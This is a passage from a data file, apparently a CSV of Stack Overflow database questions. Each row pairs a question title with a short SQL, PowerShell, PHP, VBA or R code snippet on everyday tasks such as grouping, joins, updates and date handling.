GROUP BY 
    PlayerName;
HAVING             ----> You can also use WHERE here
    ROUND(SUM(A)/SUM(TO),2) < (SELECT SUM(A)/SUM(TO) FROM GameStats_t)
"
7342,60381,Updating Single Row per Group,"with toupdate as (
      select tt.*, row_number() over (partition by OrderNumber order by id) as seqnum
      from #tempTable tt
     )
UPDATE toupdate
    SET toupdate.guestCount = q.guestCount
    FROM toupdate
    INNER JOIN queryTable q
    ON temp.OrderNumber = q.OrderNumber
    where toupdate.seqnum = 1;
"
18034,67372,How to group within groups in Access,"Day - Item
Day 1 - Item B
Day 2 - Item B
Day 3 - Item A
Day 3 - Item B
Day 3 - Item C
Day 4 - Item A
Day 5 - Item C
"
9322,62931,SQL Sum of count across 3 tables,"SELECT c.CategoryID AS [Cat ID], 
       c.Name AS [Name], 
       COUNT(s.ProductID) AS [Total Sales]
FROM Categories c
LEFT JOIN Products p
   ON c.CategoryID = p.CategoryID
LEFT JOIN Sales s
   ON p.ProductID = s.ProductID
WHERE s.Saledate BETWEEEN startDate and endDate
GROUP BY c.CategoryID, c.Name
"
28860,36779,SQL query to select one row from each group with preference,"SELECT DISTINCT
  t1.Y,
  COALESCE(a2.x, a1.x) 'x'
FROM Tablename t1
LEFT JOIN
(
    SELECT Y, MIN(x) x
    FROM Tablename
    GROUP BY Y
) a1 ON t1.Y = a1.Y
LEFT JOIN
(
    SELECT Y, MIN(x) x
    FROM Tablename
    WHERE x = 'a'
    GROUP BY Y
) a2 ON t1.Y = a2.Y;
"
34666,31545,How to order result but not selected row using sql query?," ORDER BY 
 CASE WHEN externalkey = '970000' THEN 0 else 1 END,
           org.description
"
19338,25424,use select results in update oracle,"update t_user_promotion_points p
set total_points = (select sum(amount) from t_points_receipt r where p.user_id = r.user_id and p.promotion_id = r.promotion_id)
where p.promotion_id = 10340;
"
13887,22208,Why does the inclusion of an XML column in a SELECT query have such a radically negative effect on query performance?,"SELECT Id, LEFT(Data, 10) FROM Records
"
6242,43165,in which database software / language is it possible to create a database accessible by multiple users except its two collumns to be accessed only by admin user ,"SQL> conn apc/apc
Connected.
SQL> desc emp
 Name                                      Null?    Type
 ----------------------------------------- -------- ----------------------------
 EMPNO                                     NOT NULL NUMBER(4)
 ENAME                                     NOT NULL VARCHAR2(10)
 JOB                                                VARCHAR2(9)
 MGR                                                NUMBER(4)
 HIREDATE                                           DATE
 SAL                                                NUMBER(7,2)
 COMM                                               NUMBER(7,2)
 DEPTNO                                             NUMBER(2)

SQL> create or replace view v_emp as
  2  select empno, ename, job, mgr, hiredate, deptno from emp
  3  /

View created.

SQL> grant select, insert, update (job, mgr, deptno) on v_emp to a
  2  /

Grant succeeded.

SQL> conn a/a
Connected.
SQL> create synonym emp for apc.v_emp
  2  /

Synonym created.

SQL> select * from emp where deptno = 10
  2  /

     EMPNO ENAME      JOB              MGR HIREDATE      DEPTNO
---------- ---------- --------- ---------- --------- ----------
      7782 BOEHMER    MANAGER         7839 09-JUN-81         10
      7839 SCHNEIDER  PRESIDENT            17-NOV-81         10
      7934 KISHORE    CLERK           7782 23-JAN-82         10

SQL> update emp set deptno = 40 where empno = 7934
  2  /

1 row updated.

SQL> insert into emp values (8000, 'APC', 'DOGSBODY', 7934, sysdate, 40)
  2  /

1 row created.

SQL> update emp set hiredate = sysdate-720 where empno = 7934
  2  /
update emp set hiredate = sysdate-720 where empno = 7934
       *
ERROR at line 1:
ORA-01031: insufficient privileges


SQL> delete from emp where empno = 7934
  2  /
delete from emp where empno = 7934
            *
ERROR at line 1:
ORA-01031: insufficient privileges


SQL>
"
26490,8337,select only and only specific record in oracle,"select truck
from   table
where  location in (1, 2)
group
by     truck
having count(distinct location) = 2
"
10605,63389,Select min date after selected date,"SELECT t1.obj, t1.Time as Start, min(t2.Time) as Stop
FROM TheTable t1
LEFT OUTER JOIN TheTable t2
ON t1.obj = t2.obj and t2.Description = 'Stop' and t2.Time > t1.time
WHERE t1.Description = 'Start' 
GROUP BY (t1.obj, t1.Time, t1.Description, t2.Description)
"
35139,43565,Return a SELECT match where two rows match with different column values,"select drug_name, drug_id, image_filename
from t
group by drug_name, drug_id, image_filename
having sum(cat_id = 3 and desc_id = 6) > 0 and
       sum(cat_id = 5 and desc_id = 5) > 0;
"
787,64100,SQL DATEADD with Variable," DECLARE @EndDate date;

 SELECT @EndDate = DATEADD(day, 1, atvcEndDate)
 FROM tbUserReport
 WHERE atvcUserId = @UserId;
"
16365,13968,Output rows in one table for which no match exists in another,"select ifnull(personel.firstname + ' ' + personel.lastname, scan.createdby) as CREATEDBY
from scans 
LEFT join personel on scans.createdby = personel.username;
"
30220,46628,MySQL select all rows having latest value per id,"SELECT  t1.*, 
        t2.id AS f_id, 
        t2.data AS f_data
FROM table1 t1
JOIN table1 t2
  ON t1.user = t2.user
 AND t2.id = (SELECT MAX(t2.id)
              FROM table1 t3
              WHERE t3.user = t1.user)
"
18698,51185,Order by subquery,"SELECT e.employee_id, e.last_name
FROM employees e INNER JOIN departments d
    ON e.department_id = d.department_id
ORDER BY d.department_name
"
25415,27398,Is there any alternative of DBCC CHECKIDENT?," SET IDENTITY_INSERT [MyTable] ON
INSERT INTO Mytable(ID,name)values (@AutoIncrementvalue-1,'siva')
SET IDENTITY_INSERT [MyTable] OFF

--Insert into table or whatever here
-- finally delete the value which we inserted initially
DELETE FROm MyTable WHERE ID=@AutoIncrementvalue-1
"
3179,23242,Recursive calculation in SQL (Oracle),"with main_sql as (
    select  a.*,
            b.*,
            sum(a_amt) over (partition by b_id) as cd_amt,
            rank() over (partition by a_cd order by b_id) as rnk
    from   (select a_cd, a_flag, sum(a_amt) as a_amt
            from   tablea
            group  by a_cd, a_flag) a,
            tableb b
    where   a.a_flag = case when b.b_flag = 'Y' then a.a_flag else b.b_flag end
    order by b_id, a_cd
), 
recur_sql (a_cd, b_id, total_amt, cd_amt, resulting_ratio, resulting_amt, rnk) as (
    select m.a_cd, 
           m.b_id, 
           m.a_amt as total_amt, 
           m.cd_amt, m.a_amt / m.cd_amt as resulting_ratio, 
           m.a_amt + (m.a_amt / m.cd_amt * m.b_amt) as resulting_amt, 
           rnk
    from   main_sql m
    where  rnk = 1

    union all

    select m.a_cd, 
           m.b_id, 
           r.resulting_amt as total_amt, 
           m.cd_amt, 
           r.resulting_amt / m.cd_amt as resulting_ratio, 
           r.resulting_amt + (r.resulting_amt / m.cd_amt * m.b_amt) as resulting_amt,
           m.rnk
    from recur_sql r,
         main_sql m
    where m.rnk > 1
    and   r.a_cd = m.a_cd
    and   m.rnk - 1 = r.rnk

)
select a_cd, b_id, total_amt, resulting_ratio, resulting_amt
from   recur_sql
order by 2, 1
"
37382,34134,How can show ages according specific years?,"SELECT YEAR(CURDATE())- year(date_birth) AS ages
FROM clients
WHERE date_birth <= (curdate() - interval @start year) 
and date_birth >= (curdate() - interval @end year)
"
12994,60996,Oracle : SQL with REGEXP and RTRIM for Oracle 8i,"    SUBSTR(table.column1, INSTR(table.column1, '/', -1) + 1,
    INSTR(table.column1, '.') - INSTR(table.column1, '/', -1) - 1)
"
15199,36900,How to show an specific number of rows based on starter point,"DELETE FROM CHAT_TABLE WHERE ID IN (
     SELECT ID FROM (
        SELECT ID    
        FROM CHAT_TABLE
        ORDER BY TIME DESC
        LIMIT 50) TEMPTBL
);
"
8217,75267,Find latest value earlier than specified date,"SELECT TOP 1
  Rate
FROM
  MyTable
WHERE
  DateColumn <= '20120520'
ORDER BY
  DateColumn DESC
"
38405,27992,Oracle date difference with case,"select 
  case 
      when sysdate-tableA.start_date < 120 then 1
      else 0
  end myFlag
from tableA, tableB 
where tableA.id(+) = 9999
and tableB.project_id(+) = tableA.project_id
"
14390,48797,User Created Using DACPAC Cannot Log On,"GRANT CONNECT TO [MyLogin];
GO
"
39823,63814,Modify SQL trigger to work when inserted table contains more than one row,"UPDATE A
SET A.OriginalTemplateID = B.TemplateID
FROM [dbo].[Review] A
INNER JOIN INSERTED B
    ON A.ReviewID = B.ReviewID
WHERE A.OriginalTemplateID IS NULL AND B.TemplateID IS NOT NULL

UPDATE A
SET A.OriginalClientID = B.ClientID 
FROM [dbo].[Review] A
INNER JOIN INSERTED B
    ON A.ReviewID = B.ReviewID
WHERE A.OriginalClientID IS NULL AND B.ClientID IS NOT NULL
"
24459,42075,how can we update data in database using entityframework in windows form application.?,"        GameSchedulingEntities db = new GameSchedulingEntities();
        Group obj = db.Groups.Find(Id);
        // or Group obj = db.Groups.FirstOrDefault(g => g.Name == NametextBox.Text);
        obj.Name = somethingelse;
        db.SaveChanges();
"
16985,5584,How to sum overlapping interval parts in sql,"DATEDIFF(s, CASE 
        WHEN Startdate > SignIn
            THEN StartDate
        ELSE SignIn
        END, CASE 
        WHEN StopDate < SignOut
            THEN StopDate
        ELSE Signout
        END)
"
3401,46315,Need to select sum of the same field in SQL with diffrent Conditions,"SELECT  
    t.sent_type,
    sum(s.message_count) as total,
    sum(case when s.dlr_status = 'DELIVRD' then s.message_count else 0 end) as delivered  
FROM `sent` s join `track` t on t.track_id = s.track_id  
group by t.sent_type;
"
36033,36952,SQL ranking and ties,"SELECT Value, 
count(*) over (partition by value)/2 + rank() over(order by value) as Ranking1, 
count(*) over (partition by value) + rank() over(order by value) -1 as Ranking2 
FROM table
"
8965,44878,Using cursor for fetching multiple rows and setting its data in columns,"select quoteid, compid,
       max(case when seqnum = 1 then cost end) as cost_q1,
       max(case when seqnum = 2 then cost end) as cost_q2,
       max(case when seqnum = 3 then cost end) as cost_q3
from (select b.*,
             row_number() over (partition by quoteid, compid
                                order by substr(quartercode, 1, 1), substr(quartercode, 3, 2)
                               ) as seqnum
      from b
     ) b
group by quoteid, compid
"
4266,38278,Sql subquery problem,"SELECT id 
FROM product 
WHERE expiry < GETDATE()
    AND expiry <> '-'
"
19603,47207,SQL Functions to turn inline,"with cte as (
    select *, 
        row_number() over (partition by name order by id) rn
    from product
)
select 
    c.name, 
    coalesce(c.image, pi.imageref)
from cte c
    left join plantimage pi on c.hls = pi.plantid and pi.imageNum = 1
where c.rn = 1
"
2079,59356,Insert Inner Join Statement,"INSERT INTO Sales (sProdName, sPrice, sPmtType)
SELECT Item as sProdName, 
       Price as sPrice, 
       'CASH' as sPmtType
FROM   ShoppingCart
"
11162,69854,Equal Field in Sql,"SELECT TOP 1 CandidateSerials.MobileNo     
FROM CandidateSerials 
INNER JOIN EmployerSerials
ON CandidateSerials.Id = EmployerSerials.Id
AND CandidateSerials.City = EmployerSerials.City
WHERE EmployerSerials.MobileNo ='000000000'
"
15207,47425,Query for returning if more than 3 related rows,"SELECT SALESPERSONID
FROM SALES
GROUP BY SALESPERSONID
HAVING COUNT(*) >= 3
"
35558,29895,How to use aggregate function on column cotainining string values?,"SELECT SUM( dividend ) || '/' || SUM( divisor )
       AS FractionOfSums
     , AVG( dividend / divisor )        
       AS AverageOfFractions
FROM
  ( SELECT CAST(substr(result, 1, position('/' in result)-1 ) AS int)
           AS dividend
         , CAST(substr(result, position('/' in result)+1 ) AS int)
           AS divisor
    FROM rows
  ) AS division
"
22828,51333,"PostgreSQL order of WHERE ""table"".""column"" IN query","order by CASE WHEN ""column""=1 THEN 1
              WHEN ""column""=2 THEN 2
              ELSE 3
       END
"
35899,21984,"Convert time from seconds to hours, with rounding","select cast(c.PeriodLength / (60.00*60) as decimal(6, 2));
"
4206,62935,sort result by count of string occurence in multiple fields per row,"select  *
,       (
          2 * (char_length(col1) - char_length(replace(col1,'abc',''))) +
          (char_length(col2) - char_length(replace(col2,'abc','')))
        ) / char_length('abc') as Occurances
from    YourTable
order by
        Occurances desc
"
21030,1736,Does reference consume disk space?,"create table Names (
  ID MEDIUMINT NOT NULL AUTO_INCREMENT,
  Name VARCHAR(30) NOT NULL,
  PRIMARY KEY (ID),
  UNIQUE (Name)
);

create table ChildParentNames (
  ChildName MEDIUMINT,
  ParentName MEDIUMINT,
  FOREIGN KEY (ChildName) REFERENCES Names(ID),
  FOREIGN KEY (ParentName) REFERENCES Names(ID)
)   
"
22349,26155,Outer and Inner SQL Join,"select p.*,
    account.username
from news_posts p
    join 
        (
            select id,
                username,
                0 as type
            from users
            union
            select id,
                title,
                1 as type
            from servers
        ) account
        on (
            account.id = p.poster_id
            and account.type = p.type
        )
    join follower f
        on (
            f.following_id = account.id
            and f.type = account.type
        )
where f.user_id = 1
"
14248,20253,How to structure this IF condition in MySQL trigger," DELIMITER $$
    CREATE TRIGGER trigger_name
        AFTER INSERT ON tableA
        FOR EACH ROW BEGIN

        INSERT INTO tableB
        SET sku_copy = OLD.sku,
             order_id = OLD.order_id,
            order = OLD.order;

    END$$
    DELIMITER ;
"
5249,64982,Select all data from the last 5 days,"SELECT name,date 
from Lineas
WHERE date >= DATE_SUB(CURDATE(), INTERVAL 5 DAY) AND date <= CURDATE()
ORDER BY date DESC
"
14995,44445,Oracle query for getting desired output,"With MyQuery as (select ColB from MyTable group by ColB having count(ColA) <= 1) select
t.ColB, ColA, ColC, ColD from MyTable t inner join MyQuery q on t.ColB = q.ColB
"
38568,37275,Count number of repeat rows after multi join statement,"SELECT
  P.ProductId,
  P.Name,
  P.StoreId,
  PO.OptionId,
  OC.ChoiceName,
  (SELECT COUNT(*) FROM OptionChoices WHERE OptionId = OC.OptionId) AS option_count
FROM
  Products   P
INNER JOIN
  ProductOptions PO
    ON P.ProductId = PO.ProductID
INNER JOIN
  OptionChoices  OC
    ON PO.OptionId = OC.OptionId    
WHERE
  P.ProductId=23317
"
4683,18802,Jquery flowplayer a href needs two clicks?,"<a href=""-previous page-""> Back </a> 
"
35845,31045,SQL query to count events from time periods in one query,"select sum(eventTime between timeA and timeB) as AB_count,
       sum(eventTime between timeC and timeD) as CD_count                   
from Event 
"
24326,4495,How to convert mysql query into SQL Server query?,"select * from 
(select name , ROW_NUMBER() over(order by name) rn from user ) a
where rn > 5 and rn<= 15
"
28315,67678,Find which oracle database object inserts data into a particular table?,"select 
   proc_syn.nam,
   proc_syn.referenced_owner, 
   proc_syn.referenced_name, 
   proc_syn.referenced_type,
   syn_tab.table_name
from 
   dba_dependencies proc_syn, dba_synonyms syn_tab, dba_tables tables
where 
      REFERENCED_TYPE in ( 'SYNONYM','TABLE')
  AND proc_syn.referenced_name = syn_tab.synonym_name
  AND syn_tab.synonym_name = tables.table_name
  AND syn_tab.owner = 'PUBLIC'
  AND REFERENCED_NAME = 'YOUR_TABLE_NAME'
order by 
  proc_syn.referenced_owner, syn_tab.table_name;
"
33610,6387,Get start and end date of current week in Sybase,"declare @dw_number smallint,
        @to_first_dw smallint,
        @to_last_dw smallint,
        @wk_begin_date datetime,
        @wk_end_date datetime,

select @dw_number = datepart(dw,getdate())  //get day of week number

select @to_first_dw = (@dw_number -1) * -1,  //get number of days to subtract to get week start
       @to_last_dw = 7 - @dw_number          //get number of days to add to get week end

select @wk_begin_date = dateadd(dd,@to_first_dw,getdate()),
       @wk_end_date = dateadd(dd,@to_last_dw,getdate())

select @wk_begin_date, @wk_end_date
"
100,21517,"PostgreSQL, CASE WHEN and IF","select cr.*
from (select c.city, c.restaurant, avg(orders) as restaurant_avg,
             (sum(orders) over (partition by city) /
              count(distinct restaurant) over (order by city)
             ) as city_avg
      from c_cities
      group by c.city, c.restaurant
     ) cr
where (city_avg > 120 and restuarant_avg < 100) or
      (city_avg > 100 and restaurant_avg < 80) or
      (city_avg > 30 and restaurant_avg < 20);
"
27831,65682,Select products with users,"SELECT  users.name, 
        products.name, 
        date
FROM    products
        JOIN owners 
            ON products.id = owners.id
        JOIN users 
            ON owners.id = user.id
        JOIN
        (
            SELECT productID, MAX(Date) maxDATE
            FROM owners
            GROUP BY productID
        ) nw ON owners.productID = nw.productID AND
                owners.date = nw.maxDAte
GROUP BY product.id
"
16109,6313,SQL Next Available PK in an Insert,"create table tblSource(id integer identity, StringText varchar(200))
insert into tblSource values ('test1')
insert into tblSource values ('test2')
insert into tblSource values ('test3')
insert into tblSource values ('test4')
SELECT (row_number()  over (order by id)) + 3 , id, StringText FROM tblSource t where t.id in (2,4)
"
28399,46430,How to retrieve new row data from INSERT using Oracle DataAccess with Powershell?,"
$sql = ""insert into SCM_APPS.MODULES (PACKAGE_ABBREVIATION, FULL_MODULE_NAME) values ('TES', 'Testing') RETURNING module_id INTO :module_id""
"
27813,75261,Access SQL Dual Like Join,"SELECT [Table1].[Field1], [Table 1].[Field2], Count([Table2].[ID]) AS [CountOfID]
FROM [Table2], [Table1] 
WHERE ([Table2].[Field1] Like ""*"" & [Table1].[Field1] & ""*"") 
  AND ([Table2].[Field2] Like ""*"" & [Table1].[Field2] & ""*"")
GROUP BY [Table1].[Field1], [Table1].[Field2];
"
13458,9215,Create a folder in SSISDB using powershell,"# Variables
$SSISCatalog = ""SSISDB""                    # Catalog Name
$CatalogPwd = ""P@ssw0d1""                  # Password which is needed to encrypt the deployed packages
$FolderName = ""Foldername""        #Folder Name

# Load the IntegrationServices Assembly
[System.Reflection.Assembly]::LoadWithPartialName(""Microsoft.SqlServer.Management.IntegrationServices"") | Out-Null;

# Store the IntegrationServices Assembly namespace to avoid typing it every time
$ISNamespace = ""Microsoft.SqlServer.Management.IntegrationServices""



# Create a connection to the server
$sqlConnectionString = ""Data Source=localhost;Initial Catalog=master;Integrated Security=SSPI;""
$sqlConnection = New-Object System.Data.SqlClient.SqlConnection $sqlConnectionString

# Create the Integration Services object
$integrationServices = New-Object $ISNamespace"".IntegrationServices"" $sqlConnection



# Drop the existing catalog if it exists
if ($integrationServices.Catalogs.Count -gt 0) { 

$sqlConnection = New-Object System.Data.SqlClient.SqlConnection $sqlConnectionString


$ssisServer = New-Object Microsoft.SqlServer.Management.IntegrationServices.IntegrationServices $sqlConnection
$catalog = $ssisServer.Catalogs[""SSISDB""]
# $catalog = $integrationServices.Catalogs[$SSICatalog]
#$catalog=""Catalog[@Name='SSISDB']"" 
}
else 
{# Provision a new SSIS Catalog
$catalog = New-Object $ISNamespace"".Catalog"" ($integrationServices, $SSISCatalog ,$CatalogPwd  )
$catalog.Create()
 }
Write-Host ""Creating Folder "" $FolderName "" ...""

# Create a new folder
$folder = New-Object $ISNamespace"".CatalogFolder"" ($catalog, $FolderName, ""Folder description"")
$folder.Create()


Write-Host ""All done.""
"
8861,24321,How to encode XML in T SQL without the additional XML overhead,"SELECT CAST('<values><f>' + 
    REPLACE(
        REPLACE(
            REPLACE(
                REPLACE(
                    REPLACE(value,'&','&amp;')
                    ,'""','&quot;')
                ,'<','&lt;')
            ,'>','&gt;')
        ,'|','</f><f>') + '</f></values>' AS XML)
FROM TABLE;
"
25203,34089,Copy Meta Value from one column to another column which have specific meta_key,"$sql = ""INSERT INTO `wp_postmeta` (
    `post_id` , `meta_key` , `meta_value`
)
VALUES
(
    '"".$POST_ID.""',
    '_featured_video', 
    (SELECT P1`meta_value` FROM wp_postmeta as P1 WHERE P1.`meta_key` = 'cb_video_embed_code_post' AND P1.`post_id` = '"".$POST_ID.""')
)"";
"
14398,63695,Grails: Read Oracle Database User Roles,"DBA_ROLES
DBA_ROLE_PRIVS
ROLE_TAB_PRIVS
DBA_TAB_PRIVS
DBA_USERS
SESSION_PRIVS
SESSION_ROLES
TABLE_PRIVILEGES
"
23902,16497,SELECT to Skip First and Last Rows and Select in Between,"SELECT * FROM waypoint 
WHERE id NOT IN(
        (SELECT MIN(ID) FROM waypoint where booking_id=""1""), 
        (SELECT MAX(ID) FROM waypoint where booking_id=""1"")
      )
AND booking_id=""1"";
"
30343,27093,Storing a pre-processed varchar column in the database along with the original one,"ALTER TABLE YourTable ADD lower_name AS LOWER(name) PERSISTED 
go
CREATE NONCLUSTERED INDEX IX_YourTable_lower_name 
ON YourTable (lower_name)
go
"
21087,55508,How to select from a commas separated parameter?,"SELECT TOP 1 Para1 From MyTable  
where  ','+@Name+',' like '%,'+cast(Name as varchar(100))+',%'
ORDER BY Date ASC  
"
22142,45245,SQL Inner Join query like LEFT OUTER JOIN,"SELECT O.*, D.*
FROM [dbo].[ORDER] O 
OUTER APPLY
(
    SELECT *
    FROM [dbo].CUSTOMER C
    WHERE C.CUST_ID = O.CUST_ID
) D
"
4213,24587,Select everything from 1 table and only x rows from another,"SELECT C.*, S.Name as StyleName
FROM Clothes AS C 
JOIN Style AS S on C.StyleId = S.SylelId
WHERE ClothesId = '19'
"
17039,45699,Get items before and after an item - SQL Query,"WITH NumberedZipCodes AS
(SELECT SELECT ROW_NUMBER() OVER (ORDER BY ZipCode) AS RowNumber, *
FROM ZipCodes)

SELECT * From NumberedZipCodes
WHERE RowNumber BETWEEN
(SELECT RowNumber FROM NumberedZipCodes WHERE ZipCode=91803) - 3
AND (SELECT RowNumber FROM NumberedPerson WHERE ZipCode=91803) + 3
"
35149,44688,Use results of a sql query in another query,"select jni.ItemName, jdp.PartNumber, wrp.Module
 from JRange jra
 join XmadeFrom xmf on xmf.OidOrigin = jra.Oid
 join JDPart jdp on jdp.Oid = xmf.OidDestination
 join WRPARTSATTRIBUTE wrp on wrp.Oid = jra.Oid
 join JDObject jdo on jdo.Oid = jra.Oid
 join JNamedItem jni on jni.Oid = jdo.Oid
 join 
 (select jra.Oid, jra.xmin, jra.xmax, jra.ymin, jra.ymax, jra.zmin,
      jra.zmax
   from JRange jra
   join XCatalogDefinition xmf on xmf.OidOrigin = jra.Oid
   join JDPart jdp on jdp.Oid = xmf.OidDestination
   join JDObject jdo on jdo.Oid = jra.Oid
   join JNamedItem jni on jni.Oid = jdo.Oid
   where jni.itemname like 'volumen_example%') jra2

 where jra.xmin > jra2.xmin
    AND jra.xmax < jra2.xmax
    and jra.ymin > jra2.ymin
    and jra.ymax < jra2.ymax
    and jra.zmin > jra2.zmin
    and jra.zmax < jra2.zmax
"
25895,66503,How to avoid multiple function executions in case expression without nesting,"SELECT NVL(NULLIF(SOME_PACKAGE.SOME_EXPENSIVE_FUNCTION
  ||', random string',', random string'),'something_else')
FROM SOME_TABLE;
"
28661,33120,Split date field into time and day Oracle,"CASE
WHEN to_char(start_date, 'hh24miss') BETWEEN '070000' AND '115900'
"
24697,18287,how to select 10 random records for 3 items that all 3 items exist in the selection,"SELECT id,
       store_id,
       item_id,
       product_id
  FROM (SELECT id,
               store_id,
               item_id,
               product_id,
               ROW_NUMBER ()
                  OVER (PARTITION BY store_id ORDER BY r1, DBMS_RANDOM.VALUE)
                  r2
          FROM (SELECT id,
                       store_id,
                       item_id,
                       product_id,
                       ROW_NUMBER ()
                       OVER (PARTITION BY store_id, product_id
                             ORDER BY DBMS_RANDOM.VALUE)
                          r1
                  FROM mytab))
 WHERE r2 <= 10;
"
17231,49007,MYSQL query between two unix timestamp,"SELECT *
FROM   my_table
WHERE  FROM_UNIXTIME (timestamp_column, '%k') BETWEEN 13 AND 17 AND
       FROM_UNIXTIME (timestamp_column, '%m') = 11 AND
       FROM_UNIXTIME (timestamp_column, '%Y') = 2014
"
32742,75346,R vector into String of Strings,"query <- paste(""select x, y from table where z in ("", paste(shQuote(vector, type = ""sh""), 
         collapse = ', '), "");"")
query
[1] ""select x, y from table where z in ( 'a', 'b', 'c', 'd' );""
"
23895,21258,SQL Join in Oracle,"Select 
    t1.item item,
    t1.Desc desc1, 
    t2.parentitems pitem
    ,t1_2.Desc desc2
from TAB1 t1 left join TAB2 t2 on t1.item = t2.item
left join TAB1 t1_2 on t2.parentitems = t1_2.item 
"
10958,36001,sql query very slow in phpmyadmin,"SELECT * FROM comments c JOIN users u ON c.user_id = u.id_user_coms
JOIN posts p ON c.post_id=p.id
JOIN pages pa ON p.page_id=pa.id

WHERE c.text LIKE ""%iphone%"" 
AND pa.name LIKE ""%iphone%""
"
6610,5921,access subtotal - grouped by field should occur only once,"Option Explicit

Public Sub QueryRollUp()

Dim db As Database
Dim rst_Input As DAO.Recordset
Dim rst_Output As DAO.Recordset
Dim strSQL As String
Dim tdfNew As TableDef
Dim tdfLoop As TableDef
Dim prpLoop As Property
Dim s_tdef As String
Dim s_CurrentRollUp As String
Dim s_CurrentField1 As String
Dim s_CurrentDate As String
Dim s_CurrentQty1 As Integer
Dim s_CurrentQty2 As Integer
Dim s_CurrentQty3 As Integer
Dim s_CurrentQty4 As Integer
Dim i As Integer

' If the subroutine is going to access parts of the database (tables, queries, etc.)
' you must have a representation of the database in the code.
' In this code, I use 'db' as that representation.
' VBA has a shortcut for defining the database that is currently open, and that is         'CurrentDB'.
' You can define an external database if necessary, but that goes beyond the scope of     this example.
' The below line sets the database code object 'db' equal to this database

Set db = CurrentDb

' The next step is to create a new table programaitcally for the output to go
' I choose to do this in code instead of building it in table designer
' because I want to ensure you get the correct tbl_Output that my code is
' expecting.  If you were desining a new module, and new how the correct table needed
' to be designed, you can omit everything between the hash marks

'#####################################################################################

' This current database.
' I like to use 'With' so I don't have to keep typing the name.
' I can just type .something and the code knows I really mean db.something
' Each 'With' must have an 'End With' to let the code know when you are no longer
' wanting it to assume you are using the short cut.

With db

'this loops trough all of the items in the table definitions
'the looping logic takes place between the % signs
'%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
For Each tdfLoop In .TableDefs
    ' Check the name of an item 'tdfLoop.Name' to see if it the
    ' same as ""tbl_Output"".
    If tdfLoop.Name = ""tbl_Output"" Then
        ' We are going to create this table later.
        ' If the table already exists, it will cause an error and
        ' the code will halt.  Deleting the table prevents the
        ' conflict.

        db.TableDefs.Delete ""tbl_Output""

    End If

' This bit of code moves to the next item in the table definitions collection
' and then loops back and tests for tbl_Output again.
Next tdfLoop
'%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
End With

' Create a new TableDef object.
' This assigns the object ""tbl_Output"" to a variable so I can access it
' shorthand.  The variable is called 'tdfNew'
Set tdfNew = db.CreateTableDef(""tbl_Output"")

' Using the 'With' again, but this time is tdfNew, and not db that
' I am shortcutting.  Remember that there is an implied 'tdfNew'
' in front of each .Fields.Append an also .CreateField(...)

With tdfNew
' Create fields and append them to the new TableDef
' object. This must be done before appending the
' TableDef object to the TableDefs collection of the
' database.

' Each line here adds a new field to the table
' This is the code equivilent of designing a table
' in the graphical UI
.Fields.Append .CreateField(""name"", dbText)
.Fields.Append .CreateField(""column_date"", dbText)
.Fields.Append .CreateField(""qty1"", dbInteger)
.Fields.Append .CreateField(""qty2"", dbInteger)
.Fields.Append .CreateField(""qty3"", dbInteger)
.Fields.Append .CreateField(""qty4"", dbInteger)

' Append the new TableDef object to the database.
' The net effect of this is to create a new table
' within the database using the information above.
db.TableDefs.Append tdfNew

End With

'#####################################################################################
' Open rst_Output as a recordset tied to new 'tbl_Output' table\
' the .OpenRecordset creates an incode representation of a database table.
' All of the specified table columns are recreated, and populated.  If no
' specific columns are listed (such as in a query), then it defaults to all columns.

' When using the .OpenRecordset(""table_name"", [type]) method, there are several [types]
' you can choose.  The type you choose determines the way it opens in the code
' and what you can do with it.  The most flexible is dbOpenDynaset, but is generally     slower
' in performacne with huge amounts of data.  dbOpenTable is equivelant to opening the     table directly

Set rst_Output = db.OpenRecordset(""tbl_Output"", dbOpenTable)

' Create query string to pull data from the database.
' For readability I have split this process up on several lines.
' Each time a new line is needed you must add the
' new information to the information you already have
' This is accomplished by doing strSQL = strSQL & ""..."" on each line after the first
' If you just did strSQL = ""..."" for each line, you would overwrite what was there     before

strSQL = ""select field1, column_date, sum(qty1) as Total1, sum(qty2) as Total2,     sum(qty3) as Total3, sum(qty4) as Total4 ""
strSQL = strSQL & "" from [table]""
strSQL = strSQL & "" group by field1, column_date""
strSQL = strSQL & "" union all""
strSQL = strSQL & "" select field1, 'subtotal' as column_date, sum(qty1) as Total1, sum(qty2) as Total2, sum(qty3) as Total3, sum(qty4) as Total4 ""
strSQL = strSQL & "" from [table]""
strSQL = strSQL & "" group by field1""
strSQL = strSQL & "" union all""
strSQL = strSQL & "" select '', 'Grand Total' as column_date, sum(qty1) as Total1,     sum(qty2) as Total2, sum(qty3) as Total3, sum(qty4) as Total4 ""
strSQL = strSQL & "" from [table]""
strSQL = strSQL & "" order by field1 desc, column_date asc""

' After the above code, your whole query is now stored in strSQL.

' Execute query and populate rst_Input with the result set.
' Ensure full recordset has been retrieved before continuing.
' This becomes more important the larger the result set is.
' The dbOpenSnapshot type is like creating a virtual image
' of the data just queried.  Like a photo, it can't be changed,
' only looked at.  Since we only want to read the data, this
' is a more optimal type of OpenRecordset than a dynaset.
' All of the contents are moved into rst_Input.

Set rst_Input = db.OpenRecordset(strSQL, dbOpenSnapshot)

' Now we are going to manipulate the information
' returned by the query as it is stored inside the
' rst_Input variable.
With rst_Input
' The .MoveLast forces the recordset to go the very last
' record of the returned query.  Omitting this step could
' result in the code starting before all of the data is
' returned by the query.
' .MoveFirst returns to the top of the list once all data
' is returned

.MoveLast
.MoveFirst

' Begin process of evaluating query results
' This will keep looping until the current record is the
' end of the returned data.
Do Until .EOF

    ' Use 'i' as the index of the current roll-up value.
    ' Default this value to 1 for the first each time the field1 value changes.
    ' The example  has 'xyz' and 'abc'.
    i = 1

    ' Move the data from the query which is stored in
    ' the rst_Input from the fields to variables
    s_CurrentRollUp = .Fields(""field1"").Value
    s_CurrentField1 = .Fields(""field1"").Value
    s_CurrentDate = .Fields(""column_date"").Value
    s_CurrentQty1 = .Fields(""total1"").Value
    s_CurrentQty2 = .Fields(""total2"").Value
    s_CurrentQty3 = .Fields(""total3"").Value
    s_CurrentQty4 = .Fields(""total4"").Value

    ' While working with all field1 values (i.e. 'xyz') values which are the same
    ' the following 'Do While' loop will execute.
    Do While s_CurrentRollUp = s_CurrentField1
        ' If this is the firs time the values match do everything betwen the '#' marks
        If i = 1 Then
        '#############################################

            ' If the CurrentDate value is not a real date
            ' do the following
            If s_CurrentDate = ""Grand Total"" Then

